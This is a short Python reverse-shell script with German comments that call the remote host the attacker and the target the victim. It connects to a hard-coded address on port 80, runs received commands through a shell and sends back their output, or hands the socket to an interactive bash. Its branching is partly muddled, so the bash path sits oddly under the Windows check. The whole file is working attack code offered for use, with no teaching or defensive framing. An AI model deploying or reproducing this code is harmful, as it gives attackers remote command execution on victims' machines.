#!/usr/bin/python3
# Funktioniert zwar aber ist irgendwie nicht besonders Anwender freundlich

# Importierende Module
import os
import socket
import subprocess
import sys

# ein definierter Socket mit Verbinding zum Angreifer
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.45", 80))

# Hier wird geprüft ob das Opfer ein Windowssystem mit oder ohne Cygwin ist
if sys.platform == "win32" or sys.platform == "cygwin":
    data = s.recv(8192)  # Sollte dem so sein versucht das script 8192 bytes zu empfangen
    if data:  # Wenn ein Befehl empfangen wurde
        cmd = data.decode("UTF-8", errors="replace").strip()  # werden die Bytes in UTF-8 umgewandelt
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        STDOUT, STDERR = proc.communicate()

        s.send(STDOUT)
        s.send(STDERR)

    else:
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        proc = subprocess.call(['/bin/bash', '-i'])
